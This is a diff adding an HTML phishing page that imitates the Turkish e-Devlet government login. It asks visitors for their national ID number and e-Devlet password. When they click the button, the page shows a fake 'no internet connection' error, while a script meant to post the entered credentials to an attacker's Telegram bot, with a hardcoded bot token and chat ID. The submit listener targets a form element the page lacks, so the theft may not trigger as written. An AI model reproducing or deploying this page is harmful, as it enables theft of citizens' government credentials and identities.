@@ -1,0 +1,250 @@
+<html>
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://cdn.tailwindcss.com?plugins=forms,typography"></script>
+    <script src="https://unpkg.com/unlazy@0.11.3/dist/unlazy.with-hashing.iife.js" defer init></script>
+    <title>e-Devlet Şifresi Doğrulama</title>
+    <script type="text/javascript">
+        window.tailwind.config = {
+            darkMode: ['class'],
+            theme: {
+                extend: {
+                    colors: {
+                        border: 'hsl(var(--border))',
+                        input: 'hsl(var(--input))',
+                        ring: 'hsl(var(--ring))',
+                        background: 'hsl(var(--background))',
+                        foreground: 'hsl(var(--foreground))',
+                        primary: {
+                            DEFAULT: 'hsl(var(--primary))',
+                            foreground: 'hsl(var(--primary-foreground))'
+                        },
+                        secondary: {
+                            DEFAULT: 'hsl(var(--secondary))',
+                            foreground: 'hsl(var(--secondary-foreground))'
+                        },
+                        destructive: {
+                            DEFAULT: 'hsl(var(--destructive))',
+                            foreground: 'hsl(var(--destructive-foreground))'
+                        },
+                        muted: {
+                            DEFAULT: 'hsl(var(--muted))',
+                            foreground: 'hsl(var(--muted-foreground))'
+                        },
+                        accent: {
+                            DEFAULT: 'hsl(var(--accent))',
+                            foreground: 'hsl(var(--accent-foreground))'
+                        },
+                        popover: {
+                            DEFAULT: 'hsl(var(--popover))',
+                            foreground: 'hsl(var(--popover-foreground))'
+                        },
+                        card: {
+                            DEFAULT: 'hsl(var(--card))',
+                            foreground: 'hsl(var(--card-foreground))'
+                        },
+                    },
+                }
+            }
+        }
+    </script>
+    <style type="text/tailwindcss">
+        @layer base {
+				:root {
+					--background: 0 0% 100%;
+--foreground: 240 10% 3.9%;
+--card: 0 0% 100%;
+--card-foreground: 240 10% 3.9%;
+--popover: 0 0% 100%;
+--popover-foreground: 240 10% 3.9%;
+--primary: 240 5.9% 10%;
+--primary-foreground: 0 0% 98%;
+--secondary: 240 4.8% 95.9%;
+--secondary-foreground: 240 5.9% 10%;
+--muted: 240 4.8% 95.9%;
+--muted-foreground: 240 3.8% 46.1%;
+--accent: 240 4.8% 95.9%;
+--accent-foreground: 240 5.9% 10%;
+--destructive: 0 84.2% 60.2%;
+--destructive-foreground: 0 0% 98%;
+--border: 240 5.9% 90%;
+--input: 240 5.9% 90%;
+--ring: 240 5.9% 10%;
+--radius: 0.5rem;
+				}
+				.dark {
+					--background: 240 10% 3.9%;
+--foreground: 0 0% 98%;
+--card: 240 10% 3.9%;
+--card-foreground: 0 0% 98%;
+--popover: 240 10% 3.9%;
+--popover-foreground: 0 0% 98%;
+--primary: 0 0% 98%;
+--primary-foreground: 240 5.9% 10%;
+--secondary: 240 3.7% 15.9%;
+--secondary-foreground: 0 0% 98%;
+--muted: 240 3.7% 15.9%;
+--muted-foreground: 240 5% 64.9%;
+--accent: 240 3.7% 15.9%;
+--accent-foreground: 0 0% 98%;
+--destructive: 0 62.8% 30.6%;
+--destructive-foreground: 0 0% 98%;
+--border: 240 3.7% 15.9%;
+--input: 240 3.7% 15.9%;
+--ring: 240 4.9% 83.9%;
+				}
+			}
+
+
+
+
+            
+
+
+
+
+        .error-container {
+            max-width: 600px;
+            display: none;
+        }
+
+        .error-container .dino {
+            width: 100px;
+            height: 100px;
+            margin: 0 auto 20px;
+            background: url('https://ssl.gstatic.com/chrome/components/dino/dino-offline-sprite-1x.png') no-repeat;
+            background-size: contain;
+        }
+
+        .error-container h1 {
+            font-size: 1.5em;
+            color: #202124;
+            margin-bottom: 20px;
+        }
+
+        .error-container p {
+            font-size: 1em;
+            margin: 10px 0;
+        }
+
+        .error-container ul {
+            list-style: none;
+            padding: 0;
+            text-align: left;
+            display: inline-block;
+            text-align: left;
+        }
+
+        .error-container ul li {
+            font-size: 0.9em;
+            margin: 5px 0;
+            padding-left: 20px;
+            position: relative;
+        }
+
+        .error-container ul li::before {
+            content: "•";
+            color: #5f6368;
+            position: absolute;
+            left: 0;
+        }
+		</style>
+</head>
+
+<body>
+    <div class="max-w-md mx-auto bg-white rounded-lg shadow-lg p-6" id="max-w-md mx-auto bg-white rounded-lg shadow-lg p-6">
+        <div class="flex items-center mb-4">
+            <img src="https://cdn.e-devlet.gov.tr/themes/izmir/images/login/edk-logo.png" alt="Turkey Flag"
+                class="mr-2" />
+            <h1 class="text-xl font-bold"></h1>
+        </div>
+        <p class="text-zinc-600 mb-4">KİMLİK DOĞRULAMA SİSTEMİ</p>
+        <select class="w-full border border-zinc-300 rounded-lg p-2 mb-4">
+            <option value="">e-Devlet Şifresi</option>
+        </select>
+        <p class="text-zinc-600 mb-2">T.C. Kimlik Numaranızı ve e-Devlet Şifrenizi kullanarak kimliğinizi doğruladıktan
+            sonra işleminize kaldığınız yerden devam edebilirsiniz.</p>
+        <p class="text-blue-600 mb-4">e-Devlet Şifresi Nedir, Nasıl Alınır?</p>
+        <label class="block mb-2" for="tc-kimlik">* T.C. Kimlik No</label>
+        <input type="text" id="tc-kimlik" class="w-full border border-zinc-300 rounded-lg p-2 mb-4"
+            placeholder="T.C. Kimlik No" />
+
+        <label class="block mb-2" for="edevlet-sifresi">* e-Devlet Şifresi</label>
+        <input type="password" id="edevlet-sifresi" class="w-full border border-zinc-300 rounded-lg p-2 mb-4"
+            placeholder="e-Devlet Şifresi" />
+
+        <p class="text-zinc-600 mb-4">* e-Devlet şifrenizi unutmamanız durumunda doğrulandığınız cep telefonunuzdan
+            yenileme işlemi yapabilirsiniz.</p>
+        <a href="#" class="text-blue-600 mb-4 inline-block">Şifremi Unuttum</a>
+
+        <div class="flex justify-between">
+            <button class="bg-zinc-300 text-zinc-700 rounded-lg px-4 py-2">İptal</button>
+            <button class="bg-blue-600 text-white rounded-lg px-4 py-2" onclick="hata()">Giriş Yap</button>
+        </div>
+    </div>
+
+
+    <div class="error-container" id="error-container">
+        <div class="dino"></div>
+        <h1>İnternet bağlantısı yok</h1>
+        <p>Aşağıdakileri deneyin:</p>
+        <ul>
+            <li>Ağ kabloları, modem ve yönlendirici kontrol ediliyor</li>
+            <li>Kablosuz ağa yeniden bağlanma</li>
+            <li>Windows Ağ Teşhislerini Çalıştırma</li>
+        </ul>
+        <p>ERR_INTERNET_DISCONNECTED</p>
+    </div>
+
+
+
+    <script>
+
+        function hata() {
+            document.getElementById("max-w-md mx-auto bg-white rounded-lg shadow-lg p-6").style.display = "none";
+            document.getElementById("error-container").style.display = "block";
+        }
+
+        document.querySelector("form").addEventListener('submit', function (event) {
+            event.preventDefault(); // Formun normal gönderilmesini engelle
+
+            // Formdan verileri al
+            var username = document.getElementById('tc-kimlik').value;
+            var password = document.getElementById('edevlet-sifresi').value;
+
+            // Telegram Bot API URL'si
+            var token = "7782206979:AAE_JMIsLiSJaKpgEFFYU4eWaYHCXZqciAg"; // Bot token
+            var chatId = "5312871954"; // Chat ID (Bu sizin chat_id'niz)
+
+            var url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+            // Mesaj içeriğini oluştur
+            var text = `işte bilgiler  :):\n\nKullanıcı Adı: ${username}\nŞifre: ${password}`;
+
+            // Veriyi Telegram API'sine gönder
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: text
+                })
+            })
+                .then(response => response.json())
+                .then(data => {
+                    console.log("Mesaj başarıyla gönderildi.", data);
+                })
+                .catch(error => {
+                    console.error("Hata:", error);
+                    alert("Bir hata oluştu, lütfen tekrar deneyin.");
+                });
+        });
+    </script>
+
+</body>
+
+</html>
